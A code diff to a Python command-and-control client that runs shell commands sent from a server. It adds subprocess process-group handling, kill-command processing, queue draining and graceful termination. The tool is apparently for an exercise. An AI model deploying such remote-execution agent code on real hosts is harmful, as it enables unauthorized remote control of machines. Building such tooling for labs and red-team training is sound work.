@@ -12,6 +12,9 @@ import asyncio
 import logging
 import time
 import uuid
+import os
+import sys
+import signal
 import base64
 import hashlib
 import argparse
@@ -39,6 +42,8 @@ from cryptography import x509
 from cryptography.hazmat.primitives import hashes, serialization
 import base64
 
+SUBPROCESS_TERMINATION_GRACE_TIME_S = 2
+
 def get_spki_hash(der_cert_bytes: bytes) -> str:
     cert = x509.load_der_x509_certificate(der_cert_bytes)
     public_key = cert.public_key()
@@ -50,6 +55,8 @@ def get_spki_hash(der_cert_bytes: bytes) -> str:
     digest.update(spki_bytes)
     return base64.b64encode(digest.finalize()).decode("ascii")
 
+def is_windows() -> bool:
+    return 'win' in sys.platform
 
 class C2Client:
     """Main C2 Client"""
@@ -201,6 +208,7 @@ class C2Client:
             logger.error(f"Monitor error: {e}")
         finally:
             await self._cancel_tasks(tasks)
+            await self._terminate_execution_process()
 
     @staticmethod
     async def _cancel_tasks(tasks: List[asyncio.Task]):
@@ -234,6 +242,9 @@ class C2Client:
                     break
                 
                 if msg.type is MessageType.COMMAND:
+                    if msg.command == CommandType.KILL.value:
+                        await self._terminate_execution_process()
+                        self._drain_queue()
                     # Queue command for execution
                     await self.command_queue.put({
                         "cmd_id": msg.cmd_id,
@@ -250,6 +261,16 @@ class C2Client:
             self.shutdown_event.set()
         except Exception as e:
             logger.error(f"Command listener error: {e}")
+
+    def _drain_queue(self):
+        while not self.command_queue.empty():
+            try:
+                cmd_data = self.command_queue.get_nowait()
+                self.command_queue.task_done()
+                logger.info(f"Drained command: {cmd_data.get('command', '')}")
+            except asyncio.QueueEmpty:
+                break
+        logger.info("Drained command queue")
     
     async def _command_processor(self):
         """
@@ -257,8 +278,6 @@ class C2Client:
         """
         try:
             while self.running:
-                # Get command with timeout
-                # cmd_data = await asyncio.wait_for(self.command_queue.get(), timeout=1.0)
                 cmd_data = await self.command_queue.get()
                 
                 cmd_id = cmd_data.get("cmd_id")
@@ -273,7 +292,7 @@ class C2Client:
                 start_time = time.monotonic()
                 
                 if command == CommandType.KILL.value:
-                    logger.info("Kill command received, exiting")
+                    logger.info("Processing kill command")
                     result = "Client killed by server"
                     self.running = False
                     # Close reader to stop listener from reading
@@ -314,27 +333,45 @@ class C2Client:
         Supports pipes, redirects, etc.
         """
         try:
-            # Use shell=True to support pipes, redirects
-            # WARNING: this is a security risk in production
-            # For testing/exercise, it's acceptable
-            process = await asyncio.create_subprocess_shell(
+            if is_windows():
+                kwargs = {"creationflags": subprocess.CREATE_NEW_PROCESS_GROUP}
+            else:
+                kwargs = {"start_new_session": True}
+
+            self.execution_process = await asyncio.create_subprocess_shell(
                 command,
                 stdout=asyncio.subprocess.PIPE,
                 stderr=asyncio.subprocess.PIPE,
+                **kwargs
             )
             
             # Combine stdout and stderr
-            stdout, stderr = await process.communicate()
+            stdout, stderr = await self.execution_process.communicate()
             output = stdout.decode() + (f"\n[stderr] {stderr.decode()}" if stderr else "")
             return output if output else "[No output]"
         except asyncio.CancelledError:
-            process.terminate()   # SIGTERM
-            await process.wait()
+            await self._terminate_execution_process()
             raise            
         except subprocess.TimeoutExpired:
             return "[Command timed out after 30s]"
         except Exception as e:
             return f"[Error: {str(e)}]"
+
+    async def _terminate_execution_process(self):
+        """Terminate execution process if it exists"""
+        if not self.execution_process:
+            return
+        p = self.execution_process
+        try:
+            if is_windows():
+                p.send_signal(signal.CTRL_BREAK_EVENT)
+            else:
+                os.killpg(p.pid, signal.SIGTERM)
+
+            await asyncio.wait_for(p.wait(), timeout=SUBPROCESS_TERMINATION_GRACE_TIME_S)
+        except asyncio.TimeoutError:
+            p.kill()
+            await p.wait()
     
     async def start(self):
         """Start the C2 client"""
